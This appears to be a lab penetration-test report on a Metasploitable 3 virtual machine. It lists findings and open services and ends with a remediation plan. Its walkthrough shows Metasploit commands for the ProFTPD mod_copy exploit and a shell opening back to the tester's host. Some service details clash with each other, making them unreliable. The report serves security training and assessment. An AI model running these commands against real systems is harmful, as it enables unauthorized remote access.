# 🛡️ VAPT Report: Metasploitable 3 Security Assessment

**Prepared by:** CYART
**Date:** January 2, 2026
**Target System:** Metasploitable 3 (Virtual Lab)
**Risk Level:** CRITICAL
**Tools Used:** Greenbone Vulnerability Management (OpenVAS), Nmap, Nikto, Metasploit

---

## 📋 Executive Summary
The security assessment of the Metasploitable 3 environment (IP: 192.168.56.104) indicates a **Critical** risk level. The system is currently in a **COMPROMISED** state. Multiple services are configured with default or no authentication, and several outdated software versions contain known vulnerabilities that allow for immediate Remote Code Execution (RCE) and root-level access.

**Potential Business Impact:**
* **Confidentiality Loss:** Steal all sensitive customer and business data.
* **Integrity Loss:** Modify or delete critical system files.
* **Pivot Point:** Use the server to launch attacks against other internal systems.
* **Availability Loss:** Crash the server, causing downtime.

---

## 🔍 Vulnerability Analysis
The assessment identified **225 vulnerabilities** total.

### 🔥 Critical & High Risk Findings
* **Unauthorized Root Access (Port 1524):** A backdoor service (Ingreslock) allows root access without a password.
* **Remote Code Execution (Port 21 & 3632):** Vulnerabilities in ProFTPD and DistCC allow attackers to run arbitrary commands.
* **Weak Authentication:** Database services (PostgreSQL) and web applications (phpMyAdmin) are using weak or default credentials.
* **Web Server Misconfiguration:** The Apache web server allows directory indexing, exposing internal file structures.

---

## 💻 Service Enumeration
The following open ports and services were identified during the Nmap scan:

| Port | Protocol | Service | Version | Status |
| :--- | :--- | :--- | :--- | :--- |
| **21** | TCP | FTP | ProFTPD 1.3.5 | Open |
| **22** | TCP | SSH | OpenSSH 6.6.1p1 | Open |
| **80** | TCP | HTTP | Apache 2.4.7 | Open |
| **445** | TCP | SMB | Samba 3.X - 4.X | Open |
| **1524**| TCP | Ingreslock| Backdoor Service | Open |
| **3306**| TCP | MySQL | MySQL (unauthorized)| Open |
| **3632**| TCP | distcc | RCE Vulnerable | Open |
| **5432**| TCP | PostgreSQL| Weak Password | Open |

---

## 💥 Exploitation Walkthrough (PoC)
**Objective:** Exploit the `mod_copy` vulnerability in ProFTPD 1.3.5 to achieve remote code execution.

* **Target:** `192.168.56.104`
* **Tool:** Metasploit (`exploit/unix/ftp/proftpd_modcopy_exec`)
* **Outcome:** A command shell session was successfully opened with `www-data` privileges.

**Metasploit Command Log:**
```bash
msf6 > set rhosts 192.168.56.104
msf6 > set SITEPATH /var/www/html
msf6 > run

# Result:
# [*] Command shell session 1 opened (192.168.56.103:4444 -> 192.168.56.104:45805)

🛠 Remediation Roadmap
To transition from "Vulnerable" to "Secured," the following actions are recommended:

Priority,Action Item,Affected Service,Timeframe
P0 (Critical),"Block/Disable Ports 1524 (Ingreslock), 3632 (distcc), 6000 (X11)",System-wide,Immediate
P1 (High),Update ProFTPD to non-vulnerable version,FTP (Port 21),< 24 Hours
P1 (High),"Change Default Passwords (PostgreSQL, SSH)","Database, SSH",< 24 Hours
P2 (Medium),Disable Directory Indexing in Apache,HTTP (Port 80),< 1 Week
P2 (Medium),Update phpMyAdmin to latest stable version,Web App,< 1 Week